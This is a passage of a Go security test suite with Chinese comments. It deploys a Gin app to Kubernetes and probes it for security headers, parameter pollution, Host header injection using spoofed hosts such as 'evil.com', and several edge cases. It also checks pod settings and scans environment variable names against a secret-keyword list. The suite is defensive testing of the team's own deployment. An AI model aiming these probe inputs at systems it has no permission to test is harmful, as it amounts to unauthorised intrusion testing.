	resp, err := client.Get(baseURL + "/")
	if err != nil {
		report.add(SecurityFinding{
			ID:          "SECURITY-HEADERS",
			Category:    "安全响应头",
			Description: "检查 HTTP 响应是否包含安全相关头部",
			Payload:     "GET /",
			Expected:    "所有安全头部应存在",
			Actual:      fmt.Sprintf("请求失败: %v", err),
			Status:      "WARN",
			Severity:    "中",
		})
		return
	}
	resp.Body.Close()

	for header, expected := range requiredHeaders {
		actual := resp.Header.Get(header)
		status := "PASS"
		if actual == "" {
			status = "FAIL"
		} else if !strings.EqualFold(actual, expected) && !strings.Contains(actual, expected) {
			status = "WARN"
		}

		actualStr := actual
		if actualStr == "" {
			actualStr = "(未设置)"
		}

		report.add(SecurityFinding{
			ID:          fmt.Sprintf("HEADER-%s", strings.ReplaceAll(header, "-", "_")),
			Category:    "安全响应头",
			Description: fmt.Sprintf("检查 %s 头部", header),
			Payload:     "GET /",
			Expected:    expected,
			Actual:      actualStr,
			Status:      status,
			Severity:    "中",
		})
	}
}

// testHTTPMethodPollution 测试 HTTP 参数污染。
func testHTTPMethodPollution(baseURL string, client *http.Client, report *TestReport) {
	payloads := []string{
		"/api/v1/transfer?amount=100&amount=99999",
		"/api/v1/user?id=1&id=2",
		"/api/v1/data?sort=asc&sort=desc",
		"/api/v1/list?limit=10&limit=999999",
	}

	for i, payload := range payloads {
		resp, err := client.Get(baseURL + payload)
		if err != nil {
			report.add(SecurityFinding{
				ID:          fmt.Sprintf("HPP-%d", i+1),
				Category:    "HTTP 参数污染",
				Description: "尝试通过重复参数绕过输入校验",
				Payload:     payload,
				Expected:    "应用应取第一个或拒绝请求",
				Actual:      fmt.Sprintf("请求失败: %v", err),
				Status:      "WARN",
				Severity:    "低",
			})
			continue
		}
		resp.Body.Close()

		report.add(SecurityFinding{
			ID:          fmt.Sprintf("HPP-%d", i+1),
			Category:    "HTTP 参数污染",
			Description: "尝试通过重复参数绕过输入校验",
			Payload:     payload,
			Expected:    "应用应取第一个或拒绝请求",
			Actual:      fmt.Sprintf("HTTP %d", resp.StatusCode),
			Status:      "PASS",
			Severity:    "低",
		})
	}
}

// testHostHeaderInjection 测试 Host 头注入。
func testHostHeaderInjection(baseURL string, client *http.Client, report *TestReport) {
	maliciousHosts := []string{
		"evil.com",
		"localhost",
		"127.0.0.1",
		"trusted.com@evil.com",
	}

	for i, host := range maliciousHosts {
		req, err := http.NewRequest(http.MethodGet, baseURL+"/", nil)
		if err != nil {
			continue
		}
		req.Host = host

		resp, err := client.Do(req)
		if err != nil {
			report.add(SecurityFinding{
				ID:          fmt.Sprintf("HOST-INJECTION-%d", i+1),
				Category:    "Host 头注入",
				Description: "尝试通过恶意 Host 头注入",
				Payload:     fmt.Sprintf("Host: %s", host),
				Expected:    "应用应忽略或拒绝非预期 Host",
				Actual:      fmt.Sprintf("请求失败: %v", err),
				Status:      "WARN",
				Severity:    "低",
			})
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		bodyStr := string(body)
		hasHostReflected := strings.Contains(bodyStr, host)

		status := "PASS"
		if hasHostReflected {
			status = "WARN"
		}

		report.add(SecurityFinding{
			ID:          fmt.Sprintf("HOST-INJECTION-%d", i+1),
			Category:    "Host 头注入",
			Description: "尝试通过恶意 Host 头注入",
			Payload:     fmt.Sprintf("Host: %s", host),
			Expected:    "应用应忽略或拒绝非预期 Host",
			Actual:      fmt.Sprintf("HTTP %d, host_reflected=%v", resp.StatusCode, hasHostReflected),
			Status:      status,
			Severity:    "低",
		})
	}
}

// 辅助函数

func boolPtr(b bool) *bool    { return &b }
func int64Ptr(i int64) *int64 { return &i }

func resourceQuantity(s string) resource.Quantity {
	q, _ := resource.ParseQuantity(s)
	return q
}

// 主测试入口

// verbose 控制是否输出详细日志。
var verbose = flag.Bool("verbose", false, "输出详细测试日志")

func logf(t *testing.T, format string, args ...any) {
	if *verbose {
		t.Logf(format, args...)
	}
}

// TestAttackSuite 是安全测试套件主入口。
// 执行流程: 部署 → 健康检查 → 安全测试 → 清理 → 报告。
func TestAttackSuite(t *testing.T) {
	ctx := context.Background()

	// ─── Phase 1: Setup（部署） ───
	t.Run("Setup_Kubernetes_Deployment", func(t *testing.T) {
		client := newKubeClient(t)

		t.Log("━━━ 阶段 1: Kubernetes 部署 ━━━")

		// 确保命名空间存在。
		client.ensureNamespace(ctx, t)

		// 部署 Gin 应用。
		client.deployGinApp(ctx, t)

		// 等待滚动更新完成。
		client.waitForRollout(ctx, t)

		t.Log("━━━ 部署完成 ━━━")
	})

	// ─── Phase 2: Health Check（健康检查） ───
	t.Run("Health_Check", func(t *testing.T) {
		t.Log("━━━ 阶段 2: 健康检查 ━━━")

		client := newKubeClient(t)
		nodePort := client.getServiceNodePort(ctx, t)
		baseURL := getAppBaseURL(nodePort)

		t.Logf("应用访问地址: %s", baseURL)

		// 等待健康检查端点就绪。
		waitForHealth(baseURL, t)

		// 验证所有端点。
		validateEndpoints(baseURL, t)

		t.Log("━━━ 健康检查通过 ━━━")
	})

	// ─── Phase 3: Security Tests（安全测试） ───
	t.Run("Security_Assessment", func(t *testing.T) {
		t.Log("━━━ 阶段 3: 安全评估 ━━━")

		client := newKubeClient(t)
		nodePort := client.getServiceNodePort(ctx, t)
		baseURL := getAppBaseURL(nodePort)

		// 执行安全测试。
		report := runSecurityTests(baseURL, t)

		// 打印安全报告。
		report.print()

		// 统计失败数量。
		failed := 0
		for _, f := range report.findings {
			if f.Status == "FAIL" {
				failed++
			}
		}

		if failed > 0 {
			t.Errorf("安全测试发现 %d 项失败", failed)
		}
	})

	// ─── Phase 4: Teardown（清理） ───
	t.Run("Teardown", func(t *testing.T) {
		t.Log("━━━ 阶段 4: 清理资源 ━━━")

		client := newKubeClient(t)
		client.deleteNamespace(ctx, t)

		t.Log("━━━ 清理完成 ━━━")
	})
}

// TestDeploymentSecurityContext 验证 Deployment 的 SecurityContext 配置。
func TestDeploymentSecurityContext(t *testing.T) {
	ctx := context.Background()
	client := newKubeClient(t)

	// 确保命名空间存在。
	client.ensureNamespace(ctx, t)

	// 部署应用。
	client.deployGinApp(ctx, t)
	defer client.deleteNamespace(ctx, t)

	// 获取 Deployment。
	dep, err := client.clientset.AppsV1().Deployments(testNamespace).Get(ctx, appName, metav1.GetOptions{})
	if err != nil {
		t.Fatalf("获取 Deployment 失败: %v", err)
	}

	// 验证容器 SecurityContext。
	container := dep.Spec.Template.Spec.Containers[0]
	sc := container.SecurityContext

	if sc == nil {
		t.Fatal("SecurityContext 未设置")
	}

	checks := []struct {
		name string
		ok   bool
	}{
		{"RunAsNonRoot", sc.RunAsNonRoot != nil && *sc.RunAsNonRoot},
		{"RunAsUser=1000", sc.RunAsUser != nil && *sc.RunAsUser == 1000},
		{"ReadOnlyRootFilesystem", sc.ReadOnlyRootFilesystem != nil && *sc.ReadOnlyRootFilesystem},
		{"AllowPrivilegeEscalation=false", sc.AllowPrivilegeEscalation != nil && !*sc.AllowPrivilegeEscalation},
	}

	for _, check := range checks {
		t.Run(check.name, func(t *testing.T) {
			if !check.ok {
				t.Errorf("SecurityContext 检查失败: %s", check.name)
			} else {
				t.Logf("SecurityContext 检查通过: %s ✅", check.name)
			}
		})
	}
}

// TestPodSecurityContext 验证 Pod 级别的 SecurityContext。
func TestPodSecurityContext(t *testing.T) {
	ctx := context.Background()
	client := newKubeClient(t)

	client.ensureNamespace(ctx, t)
	client.deployGinApp(ctx, t)
	defer client.deleteNamespace(ctx, t)

	dep, err := client.clientset.AppsV1().Deployments(testNamespace).Get(ctx, appName, metav1.GetOptions{})
	if err != nil {
		t.Fatalf("获取 Deployment 失败: %v", err)
	}

	podSC := dep.Spec.Template.Spec.SecurityContext

	if podSC == nil {
		t.Log("Pod 级别 SecurityContext 未设置（容器级别已配置）")
		return
	}

	if podSC.RunAsNonRoot != nil && *podSC.RunAsNonRoot {
		t.Logf("Pod RunAsNonRoot=true ✅")
	}

	if podSC.SeccompProfile != nil {
		t.Logf("Pod SeccompProfile=%s ✅", podSC.SeccompProfile.Type)
	}
}

// TestNetworkIsolation 验证 Pod 之间的网络隔离。
func TestNetworkIsolation(t *testing.T) {
	ctx := context.Background()
	client := newKubeClient(t)

	client.ensureNamespace(ctx, t)
	defer client.deleteNamespace(ctx, t)

	// 检查是否存在 NetworkPolicy。
	policies, err := client.clientset.NetworkingV1().NetworkPolicies(testNamespace).List(ctx, metav1.ListOptions{})
	if err != nil {
		t.Logf("无法查询 NetworkPolicy: %v", err)
		return
	}

	if len(policies.Items) == 0 {
		t.Log("⚠ 未配置 NetworkPolicy，Pod 间无网络隔离")
	} else {
		t.Logf("已配置 %d 个 NetworkPolicy ✅", len(policies.Items))
	}
}

// TestResourceLimits 验证资源限制配置。
func TestResourceLimits(t *testing.T) {
	ctx := context.Background()
	client := newKubeClient(t)

	client.ensureNamespace(ctx, t)
	client.deployGinApp(ctx, t)
	defer client.deleteNamespace(ctx, t)

	dep, err := client.clientset.AppsV1().Deployments(testNamespace).Get(ctx, appName, metav1.GetOptions{})
	if err != nil {
		t.Fatalf("获取 Deployment 失败: %v", err)
	}

	container := dep.Spec.Template.Spec.Containers[0]

	if container.Resources.Limits == nil {
		t.Error("未设置资源限制 Limits")
	} else {
		t.Logf("资源限制已设置 ✅: CPU=%s Memory=%s",
			container.Resources.Limits.Cpu(),
			container.Resources.Limits.Memory())
	}

	if container.Resources.Requests == nil {
		t.Error("未设置资源请求 Requests")
	} else {
		t.Logf("资源请求已设置 ✅: CPU=%s Memory=%s",
			container.Resources.Requests.Cpu(),
			container.Resources.Requests.Memory())
	}
}

// TestNoSecretsInEnv 验证环境变量中没有硬编码密钥。
func TestNoSecretsInEnv(t *testing.T) {
	ctx := context.Background()
	client := newKubeClient(t)

	client.ensureNamespace(ctx, t)
	client.deployGinApp(ctx, t)
	defer client.deleteNamespace(ctx, t)

	dep, err := client.clientset.AppsV1().Deployments(testNamespace).Get(ctx, appName, metav1.GetOptions{})
	if err != nil {
		t.Fatalf("获取 Deployment 失败: %v", err)
	}

	container := dep.Spec.Template.Spec.Containers[0]

	suspiciousKeys := []string{
		"PASSWORD", "SECRET", "TOKEN", "API_KEY",
		"PRIVATE_KEY", "DATABASE_URL", "REDIS_URL",
	}

	for _, env := range container.Env {
		upperName := strings.ToUpper(env.Name)
		for _, suspicious := range suspiciousKeys {
			if strings.Contains(upperName, suspicious) {
				if env.ValueFrom == nil {
					t.Errorf("环境变量 %s 直接包含值（应使用 Secret 引用）: %s", env.Name, env.Value)
				} else {
					t.Logf("环境变量 %s 使用 Secret 引用 ✅", env.Name)
				}
			}
		}
	}
}

// TestMain 处理 flag 解析。
func TestMain(m *testing.M) {
	flag.Parse()
	os.Exit(m.Run())
}

// 边缘场景测试

// TestLargePayload 测试大尺寸请求体处理。
func TestLargePayload(t *testing.T) {
	if testing.Short() {
		t.Skip("跳过大尺寸载荷测试")
	}

	baseURL := getTestBaseURL(t)
	if baseURL == "" {
		t.Skip("无法获取应用地址")
	}

	client := &http.Client{Timeout: 30 * time.Second}

	// 1MB 载荷。
	largeBody := strings.Repeat("A", 1024*1024)
	resp, err := client.Post(baseURL+"/api/v1/upload", "text/plain", strings.NewReader(largeBody))
	if err != nil {
		t.Fatalf("请求失败: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 500 {
		t.Errorf("服务端处理大载荷崩溃: HTTP %d", resp.StatusCode)
	}
	t.Logf("大载荷响应: HTTP %d", resp.StatusCode)
}

// TestSlowLoris 测试慢速连接攻击防御。
func TestSlowLoris(t *testing.T) {
	if testing.Short() {
		t.Skip("跳过慢速连接测试")
	}

	baseURL := getTestBaseURL(t)
	if baseURL == "" {
		t.Skip("无法获取应用地址")
	}

	// 构造慢速请求。
	req, err := http.NewRequest(http.MethodPost, baseURL+"/api/v1/upload", nil)
	if err != nil {
		t.Fatalf("构造请求失败: %v", err)
	}

	client := &http.Client{Timeout: 2 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		// 超时是预期行为。
		t.Logf("服务端正确拒绝慢速连接: %v", err)
		return
	}
	defer resp.Body.Close()

	t.Logf("慢速连接响应: HTTP %d", resp.StatusCode)
}

// TestConcurrentRequests 测试并发请求处理。
func TestConcurrentRequests(t *testing.T) {
	baseURL := getTestBaseURL(t)
	if baseURL == "" {
		t.Skip("无法获取应用地址")
	}

	const concurrency = 50
	const requests = 200

	client := &http.Client{Timeout: 10 * time.Second}
	var wg sync.WaitGroup
	var failed int64
	var mu sync.Mutex

	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			for j := 0; j < requests/concurrency; j++ {
				resp, err := client.Get(baseURL + healthPath)
				if err != nil {
					mu.Lock()
					failed++
					mu.Unlock()
					continue
				}
				resp.Body.Close()
				if resp.StatusCode != http.StatusOK {
					mu.Lock()
					failed++
					mu.Unlock()
				}
			}
		}(i)
	}

	wg.Wait()

	if failed > 0 {
		t.Errorf("并发测试: %d/%d 请求失败", failed, requests)
	} else {
		t.Logf("并发测试通过: %d 请求全部成功 ✅", requests)
	}
}

// TestEmptyBody 测试空请求体处理。
func TestEmptyBody(t *testing.T) {
	baseURL := getTestBaseURL(t)
	if baseURL == "" {
		t.Skip("无法获取应用地址")
	}

	client := &http.Client{Timeout: 5 * time.Second}
	endpoints := []string{
		"/api/v1/exec",
		"/api/v1/query",
		"/api/v1/echo",
		"/api/v1/fetch",
		"/api/v1/redirect",
	}

	for _, ep := range endpoints {
		t.Run(ep, func(t *testing.T) {
			resp, err := client.Post(baseURL+ep, "application/json", strings.NewReader(""))
			if err != nil {
				t.Fatalf("请求失败: %v", err)
			}
			defer resp.Body.Close()

			if resp.StatusCode >= 500 {
				t.Errorf("空请求体导致服务端错误: %s HTTP %d", ep, resp.StatusCode)
			}
			t.Logf("空请求体响应: %s HTTP %d", ep, resp.StatusCode)
		})
	}
}

// TestMalformedJSON 测试畸形 JSON 处理。
func TestMalformedJSON(t *testing.T) {
	baseURL := getTestBaseURL(t)
	if baseURL == "" {
		t.Skip("无法获取应用地址")
	}

	client := &http.Client{Timeout: 5 * time.Second}
	payloads := []string{
		`{"broken":`,
		`{`,
		`}{`,
		`{"key": "value"`,
		`null`,
		`[1,2,`,
		`{"a":1}{"b":2}`,
		`"unterminated string`,
	}

	for i, payload := range payloads {
		t.Run(fmt.Sprintf("malformed-%d", i+1), func(t *testing.T) {
			resp, err := client.Post(
				baseURL+"/api/v1/echo",
				"application/json",
				strings.NewReader(payload),
			)
			if err != nil {
				t.Fatalf("请求失败: %v", err)
			}
			defer resp.Body.Close()

			if resp.StatusCode >= 500 {
				t.Errorf("畸形 JSON 导致服务端错误: payload=%q HTTP %d", payload, resp.StatusCode)
			}
			t.Logf("畸形 JSON 响应: payload=%q HTTP %d", payload, resp.StatusCode)
		})
	}
}

// TestHTTPTimeout 测试超时请求处理。
func TestHTTPTimeout(t *testing.T) {
	baseURL := getTestBaseURL(t)
	if baseURL == "" {
		t.Skip("无法获取应用地址")
	}

	client := &http.Client{Timeout: 1 * time.Second}
	resp, err := client.Get(baseURL + "/api/v1/slow")
	if err != nil {
		t.Logf("请求正确超时: %v", err)
		return
	}
	defer resp.Body.Close()

	t.Logf("超时端点响应: HTTP %d", resp.StatusCode)
}

// TestUnicodeInput 测试 Unicode 输入处理。
func TestUnicodeInput(t *testing.T) {
	baseURL := getTestBaseURL(t)
	if baseURL == "" {
		t.Skip("无法获取应用地址")
	}

	client := &http.Client{Timeout: 5 * time.Second}
	payloads := []string{
		"你好世界",
		"🚀🔥💀",
		"undefined",
		"\x00\x01\x02",
		"%E2%80%8B",                // 零宽空格
		strings.Repeat("A", 10000), // 长字符串
	}

	for i, payload := range payloads {
		t.Run(fmt.Sprintf("unicode-%d", i+1), func(t *testing.T) {
			form := url.Values{}
			form.Set("input", payload)

			resp, err := client.PostForm(baseURL+"/api/v1/echo", form)
			if err != nil {
				t.Fatalf("请求失败: %v", err)
			}
			defer resp.Body.Close()

			if resp.StatusCode >= 500 {
				t.Errorf("Unicode 输入导致服务端错误: payload=%q HTTP %d", payload, resp.StatusCode)
			}
			t.Logf("Unicode 输入响应: payload=%q HTTP %d", payload, resp.StatusCode)
		})
	}
}

// 错误处理测试

// TestKubeClientConnectionError 测试 Kubernetes 客户端连接错误处理。
func TestKubeClientConnectionError(t *testing.T) {
	// 保存原始 KUBECONFIG。
	origKubeconfig := os.Getenv("KUBECONFIG")
	defer os.Setenv("KUBECONFIG", origKubeconfig)

	// 设置不存在的 kubeconfig。
	os.Setenv("KUBECONFIG", "/nonexistent/path/kubeconfig.yaml")

	// 尝试创建客户端应失败。
	home := homedir.HomeDir()
	kubeconfig := filepath.Join(home, ".kube", "config")
	if env := os.Getenv("KUBECONFIG"); env != "" {
		kubeconfig = env
	}

	_, err := clientcmd.BuildConfigFromFlags("", kubeconfig)
	if err == nil {
		t.Log("kubeconfig 存在但预期不存在")
	} else {
		t.Logf("正确处理 kubeconfig 错误: %v ✅", err)
	}
}

// TestNamespaceDeletionTimeout 测试命名空间删除超时处理。
func TestNamespaceDeletionTimeout(t *testing.T) {
	ctx := context.Background()
	client := newKubeClient(t)

	// 创建临时命名空间。
	tempNs := &corev1.Namespace{
		ObjectMeta: metav1.ObjectMeta{
			Name: "kestrel-test-timeout",
			Labels: map[string]string{
				"app.kubernetes.io/name": "kestrel-test",
			},
		},
	}

	_, err := client.clientset.CoreV1().Namespaces().Create(ctx, tempNs, metav1.CreateOptions{})
	if err != nil && !errors.IsAlreadyExists(err) {
		t.Fatalf("创建命名空间失败: %v", err)
	}

	// 立即删除。
	err = client.clientset.CoreV1().Namespaces().Delete(ctx, "kestrel-test-timeout", metav1.DeleteOptions{})
	if err != nil {
		t.Logf("删除命名空间失败（预期行为）: %v", err)
	}

	// 等待删除完成。
	deleted := false
	for i := 0; i < 10; i++ {
		_, err := client.clientset.CoreV1().Namespaces().Get(ctx, "kestrel-test-timeout", metav1.GetOptions{})
		if errors.IsNotFound(err) {
			deleted = true
			break
		}
		time.Sleep(time.Second)
	}

	if deleted {
		t.Log("命名空间删除超时测试通过 ✅")
	} else {
		t.Log("命名空间删除超时，可能需要手动清理")
	}
}

// TestInvalidDeploySpec 测试无效 Deployment 规格处理。
func TestInvalidDeploySpec(t *testing.T) {
	ctx := context.Background()
	client := newKubeClient(t)
	client.ensureNamespace(ctx, t)
	defer client.deleteNamespace(ctx, t)

	// 创建无效 Deployment（缺少 selector）。
	invalidDep := &appsv1.Deployment{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "invalid-dep",
			Namespace: testNamespace,
		},
		Spec: appsv1.DeploymentSpec{
			Replicas: int32Ptr(1),
			// 故意缺少 Selector。
			Template: corev1.PodTemplateSpec{
				ObjectMeta: metav1.ObjectMeta{
					Labels: map[string]string{"app": "invalid"},
				},
				Spec: corev1.PodSpec{
					Containers: []corev1.Container{
						{Name: "invalid", Image: "nonexistent:latest"},
					},
				},
			},
		},
	}

	_, err := client.clientset.AppsV1().Deployments(testNamespace).Create(ctx, invalidDep, metav1.CreateOptions{})
	if err == nil {
		t.Error("无效 Deployment 创建应失败")
		// 清理。
		_ = client.clientset.AppsV1().Deployments(testNamespace).Delete(ctx, "invalid-dep", metav1.DeleteOptions{})
	} else {
		t.Logf("正确拒绝无效 Deployment: %v ✅", err)
	}
}

// 集成点测试

// TestServiceDNSResolution 测试集群内 Service DNS 解析。
func TestServiceDNSResolution(t *testing.T) {
	ctx := context.Background()
	client := newKubeClient(t)

	client.ensureNamespace(ctx, t)
	client.deployGinApp(ctx, t)
	defer client.deleteNamespace(ctx, t)

	// 获取 Service。
	svc, err := client.clientset.CoreV1().Services(testNamespace).Get(ctx, appName, metav1.GetOptions{})
	if err != nil {
		t.Fatalf("获取 Service 失败: %v", err)
	}

	// 验证 Service 有 ClusterIP。
	if svc.Spec.ClusterIP == "" || svc.Spec.ClusterIP == "None" {
		t.Error("Service 没有 ClusterIP")
	} else {
		t.Logf("Service ClusterIP: %s ✅", svc.Spec.ClusterIP)
	}

	// 验证 Service 有正确的 selector。
	if len(svc.Spec.Selector) == 0 {
		t.Error("Service 没有 selector")
	} else {
		t.Logf("Service selector: %v ✅", svc.Spec.Selector)
	}
}

// TestPodRestartRecovery 测试 Pod 重启恢复。
func TestPodRestartRecovery(t *testing.T) {
	if testing.Short() {
		t.Skip("跳过 Pod 重启恢复测试")
	}

	ctx := context.Background()
	client := newKubeClient(t)

	client.ensureNamespace(ctx, t)
	client.deployGinApp(ctx, t)
	defer client.deleteNamespace(ctx, t)

	// 等待滚动更新。
	client.waitForRollout(ctx, t)

	// 列出 Pod。
	pods, err := client.clientset.CoreV1().Pods(testNamespace).List(ctx, metav1.ListOptions{
		LabelSelector: fmt.Sprintf("%s=%s", appLabel, appLabelValue),
	})
	if err != nil {
		t.Fatalf("列出 Pod 失败: %v", err)
	}

	if len(pods.Items) == 0 {
		t.Fatal("没有找到运行中的 Pod")
	}

	// 删除一个 Pod 验证自动恢复。
	podName := pods.Items[0].Name
	t.Logf("删除 Pod %s 验证自动恢复", podName)

	err = client.clientset.CoreV1().Pods(testNamespace).Delete(ctx, podName, metav1.DeleteOptions{})
	if err != nil {
		t.Fatalf("删除 Pod 失败: %v", err)
	}

	// 等待新 Pod 就绪。
	deadline := time.Now().Add(60 * time.Second)
	for time.Now().Before(deadline) {
		dep, err := client.clientset.AppsV1().Deployments(testNamespace).Get(ctx, appName, metav1.GetOptions{})
		if err != nil {
			t.Fatalf("查询 Deployment 失败: %v", err)
		}

		if dep.Status.ReadyReplicas == *dep.Spec.Replicas {
			t.Logf("Pod 自动恢复成功: %d/%d 就绪 ✅", dep.Status.ReadyReplicas, *dep.Spec.Replicas)
			return
		}
		time.Sleep(2 * time.Second)
	}

	t.Error("Pod 自动恢复超时")
}

// TestRollingUpdate 验证滚动更新不中断服务。
func TestRollingUpdate(t *testing.T) {
	if testing.Short() {
		t.Skip("跳过滚动更新测试")
	}

	ctx := context.Background()
	client := newKubeClient(t)

	client.ensureNamespace(ctx, t)
	client.deployGinApp(ctx, t)
	defer client.deleteNamespace(ctx, t)

	client.waitForRollout(ctx, t)

	// 获取当前 Deployment。
	dep, err := client.clientset.AppsV1().Deployments(testNamespace).Get(ctx, appName, metav1.GetOptions{})
	if err != nil {
		t.Fatalf("获取 Deployment 失败: %v", err)
	}

	// 更新镜像标签触发滚动更新。
	dep.Spec.Template.Spec.Containers[0].Image = ginImage + "-v2"
	_, err = client.clientset.AppsV1().Deployments(testNamespace).Update(ctx, dep, metav1.UpdateOptions{})
	if err != nil {
		t.Fatalf("触发滚动更新失败: %v", err)
	}

	// 持续健康检查验证不中断。
	nodePort := client.getServiceNodePort(ctx, t)
	baseURL := getAppBaseURL(nodePort)

	client2 := &http.Client{Timeout: 3 * time.Second}
	failures := 0
	totalChecks := 0

	deadline := time.Now().Add(90 * time.Second)
	for time.Now().Before(deadline) {
		resp, err := client2.Get(baseURL + healthPath)
		totalChecks++
		if err != nil || resp.StatusCode != http.StatusOK {
			failures++
		}
		if resp != nil {
			resp.Body.Close()
		}
		time.Sleep(time.Second)
	}

	t.Logf("滚动更新期间: %d/%d 次健康检查失败", failures, totalChecks)

	if failures > totalChecks/5 {
		t.Errorf("滚动更新期间服务中断过多: %d/%d 失败", failures, totalChecks)
	}
}

// TestConfigMapPropagation 测试 ConfigMap 更新传播。
func TestConfigMapPropagation(t *testing.T) {
	ctx := context.Background()
	client := newKubeClient(t)

	client.ensureNamespace(ctx, t)
	defer client.deleteNamespace(ctx, t)

	// 创建 ConfigMap。
	cm := &corev1.ConfigMap{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "test-config",
			Namespace: testNamespace,
		},
		Data: map[string]string{
			"TEST_KEY": "initial_value",
		},
	}

	_, err := client.clientset.CoreV1().ConfigMaps(testNamespace).Create(ctx, cm, metav1.CreateOptions{})
	if err != nil {
		t.Fatalf("创建 ConfigMap 失败: %v", err)
	}

	// 读取验证。
	cmRead, err := client.clientset.CoreV1().ConfigMaps(testNamespace).Get(ctx, "test-config", metav1.GetOptions{})
	if err != nil {
		t.Fatalf("读取 ConfigMap 失败: %v", err)
	}

	if cmRead.Data["TEST_KEY"] != "initial_value" {
		t.Errorf("ConfigMap 数据不匹配: %s", cmRead.Data["TEST_KEY"])
	} else {
		t.Logf("ConfigMap 数据正确 ✅")
	}

	// 更新。
	cmRead.Data["TEST_KEY"] = "updated_value"
	_, err = client.clientset.CoreV1().ConfigMaps(testNamespace).Update(ctx, cmRead, metav1.UpdateOptions{})
	if err != nil {
		t.Fatalf("更新 ConfigMap 失败: %v", err)
	}

	// 再次读取验证。
	cmUpdated, err := client.clientset.CoreV1().ConfigMaps(testNamespace).Get(ctx, "test-config", metav1.GetOptions{})
	if err != nil {
		t.Fatalf("读取更新后 ConfigMap 失败: %v", err)
	}

	if cmUpdated.Data["TEST_KEY"] != "updated_value" {
		t.Errorf("ConfigMap 更新未生效: %s", cmUpdated.Data["TEST_KEY"])
	} else {
		t.Logf("ConfigMap 更新已生效 ✅")
	}
}

// TestServiceAccountToken 验证 ServiceAccount Token 挂载。
func TestServiceAccountToken(t *testing.T) {
	ctx := context.Background()
	client := newKubeClient(t)

	client.ensureNamespace(ctx, t)
	client.deployGinApp(ctx, t)
	defer client.deleteNamespace(ctx, t)

	// 获取 Pod。
	pods, err := client.clientset.CoreV1().Pods(testNamespace).List(ctx, metav1.ListOptions{
		LabelSelector: fmt.Sprintf("%s=%s", appLabel, appLabelValue),
	})
	if err != nil {
		t.Fatalf("列出 Pod 失败: %v", err)
	}

	if len(pods.Items) == 0 {
		t.Fatal("没有运行中的 Pod")
	}

	pod := pods.Items[0]

	// 验证 ServiceAccount 挂载。
	foundSAVolume := false
	for _, vol := range pod.Spec.Volumes {
		if vol.Projected != nil {
			for _, source := range vol.Projected.Sources {
				if source.ServiceAccountToken != nil {
					foundSAVolume = true
					t.Logf("ServiceAccount Token 挂载: %s ✅", vol.Name)
				}
			}
		}
	}

	if !foundSAVolume {
		t.Log("未找到 ServiceAccount Token 投影卷（默认挂载行为）")
	}

	// 验证 Pod 使用了 ServiceAccount。
	if pod.Spec.ServiceAccountName == "" {
		t.Log("Pod 未指定 ServiceAccountName（使用默认）")
	} else {
		t.Logf("Pod ServiceAccount: %s ✅", pod.Spec.ServiceAccountName)
	}
}

// TestSecretMount 验证 Secret 挂载（如果配置了）。
func TestSecretMount(t *testing.T) {
	ctx := context.Background()
	client := newKubeClient(t)

	client.ensureNamespace(ctx, t)
	defer client.deleteNamespace(ctx, t)

	// 创建测试 Secret。
	secret := &corev1.Secret{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "test-secret",
			Namespace: testNamespace,
		},
		StringData: map[string]string{
			"api_key": "test-key-value",
		},
	}

	_, err := client.clientset.CoreV1().Secrets(testNamespace).Create(ctx, secret, metav1.CreateOptions{})
	if err != nil {
		t.Fatalf("创建 Secret 失败: %v", err)
	}

	// 读取验证。
	secretRead, err := client.clientset.CoreV1().Secrets(testNamespace).Get(ctx, "test-secret", metav1.GetOptions{})
	if err != nil {
		t.Fatalf("读取 Secret 失败: %v", err)
	}

	if _, ok := secretRead.Data["api_key"]; !ok {
		t.Error("Secret 数据不包含 api_key")
	} else {
		t.Logf("Secret 数据已正确存储 ✅")
	}
}

// 辅助函数（集成测试专用）

func int32Ptr(i int32) *int32 { return &i }

// getTestBaseURL 获取测试应用的访问地址（如果可用）。
func getTestBaseURL(t *testing.T) string {
	if t != nil {
		t.Helper()
	}

	// 尝试从环境变量获取。
	if baseURL := os.Getenv("TEST_APP_URL"); baseURL != "" {
		return baseURL
	}

	// 尝试从 Minikube 获取。
	ip := getMinikubeIP(t)
	if ip == "" {
		return ""
	}

	// 默认 NodePort。
	return fmt.Sprintf("http://%s:30080", ip)
}
